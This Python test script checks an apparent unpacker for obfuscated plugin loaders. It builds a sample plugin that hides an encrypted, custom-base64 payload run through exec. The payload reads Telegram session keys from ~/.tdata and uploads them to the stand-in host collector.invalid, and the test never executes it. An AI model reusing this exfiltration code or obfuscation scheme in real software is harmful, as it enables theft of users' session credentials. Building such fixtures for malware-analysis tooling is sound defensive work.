#!/usr/bin/env python3
"""Round-trip check for scripts/unpack_nw_loader.py (payload is never executed)."""
import base64
import hashlib
import os
import random
import subprocess
import sys
import tempfile
import textwrap
import zlib
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
TOOL = ROOT / "scripts/unpack_nw_loader.py"
sys.path.insert(0, str(ROOT / "scripts"))
import unpack_nw_loader as loader  # noqa: E402

PAYLOAD = textwrap.dedent(
    """
    import os, urllib.request
    HOOK = "https://collector.invalid/up"
    def push():
        blob = open(os.path.expanduser("~/.tdata/key_datas"), "rb").read()
        urllib.request.urlopen(HOOK, data=blob, timeout=5)
    push()
    """
).lstrip()

ABC = "MijPZOwvN439pK2rHbBVXmQoudS8yq+eWRa7/5CxDkn0g1YLctEzsFAh6GUITJlf"
STD = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"


def build_plugin(plugin_id: str, strict: bool = True) -> str:
    rnd = random.Random(1234)
    tab = [rnd.randrange(256) for _ in range(96)]
    idx = [rnd.randrange(96) for _ in range(32)]
    idx[0] = 0
    ms = 151
    pepper = [rnd.randrange(256) for _ in range(8)]
    nonce = bytes(rnd.randrange(256) for _ in range(16))

    ik = hashlib.sha256(bytes(pepper) + plugin_id.encode()).digest()
    m = bytes((tab[idx[t]] - ms) & 255 for t in range(32))
    key = bytes((m[t] ^ ik[t]) & 255 for t in range(32))

    ct = loader.keystream_xor(zlib.compress(PAYLOAD.encode()), key, nonce)
    mac = hashlib.sha256(key + nonce + ct).digest()
    b64 = base64.b64encode(ct).decode().translate(str.maketrans(STD, ABC))
    chunks = "\n    ".join("'%s'" % b64[i : i + 120] for i in range(0, len(b64), 120))

    def tup(values):
        return "(" + ",".join(str(v) for v in values) + ")"

    def byt(values):
        return "bytes((" + ",".join(str(v) for v in values) + "))"

    return (
        '__id__ = "%s"\n'
        "class Plugin:\n"
        "    def _x7a3(self):\n"
        "        _id = str(globals().get(\"__id__\") or \"\")\n"
        "        _ik = __import__(\"hashlib\").sha256(bytes([%s]) + _id.encode()).digest()\n"
        "        _tab = %s\n"
        "        _idx = %s\n"
        "        _ms = %d\n"
        "        _m = bytearray(32)\n"
        "        _k = bytes((_m[_t] ^ _ik[_t]) & 255 for _t in range(32))\n"
        "        _abc = \"%s\"\n"
        "        _std = \"%s\"\n"
        "        _enc = (%s)\n"
        "        _tr = str.maketrans(_abc, _std)\n"
        "        _ct = __import__(\"base64\").b64decode(_enc.translate(_tr) + (\"=\" * 2))\n"
        "        _n = %s\n"
        "        _mac = %s\n"
        "        _src = __import__(\"zlib\").decompress(self._x7a4(_ct, _k, _n)).decode(\"utf-8\")\n"
        "        exec(compile(_src, \"<n>\", \"exec\"), globals())\n"
        % (
            plugin_id,
            ",".join(str(v) for v in pepper),
            tup(tab),
            tup(idx),
            ms,
            ABC,
            STD,
            chunks,
            byt(nonce),
            byt(mac),
        )
    )


with tempfile.TemporaryDirectory() as tmp:
    plugin_id = "femboy_lyricspp_plugin_9d27"
    src = Path(tmp) / "sample.plugin"
    src.write_text(build_plugin(plugin_id), encoding="utf-8")
    out = Path(tmp) / "hidden.py"
    res = subprocess.run(
        [sys.executable, str(TOOL), str(src), "--out", str(out), "--extract-strings"],
        capture_output=True,
        text=True,
    )
    assert res.returncode == 0, res.stderr
    assert "collector.invalid" in res.stdout
    assert "данные сессии Telegram" in res.stdout
    decoded = out.read_text(encoding="utf-8")
    assert "~/.tdata/key_datas" in decoded and "НЕ ИСПОЛНЯТЬ" in decoded

    # Тот же блок, но с другим __id__: ключ другой, значит должен сработать MAC-guard.
    broken = Path(tmp) / "broken.plugin"
    broken.write_text(build_plugin("another_plugin").replace('__id__ = "another_plugin"', '__id__ = "femboy_lyricspp_plugin_9d27"', 1), encoding="utf-8")
    res = subprocess.run([sys.executable, str(TOOL), str(broken), "--out", str(Path(tmp) / "x.py")], capture_output=True, text=True)
    assert res.returncode == 1 and "контрольный хэш" in res.stderr, (res.returncode, res.stderr)

print("unpack_nw_loader: OK")
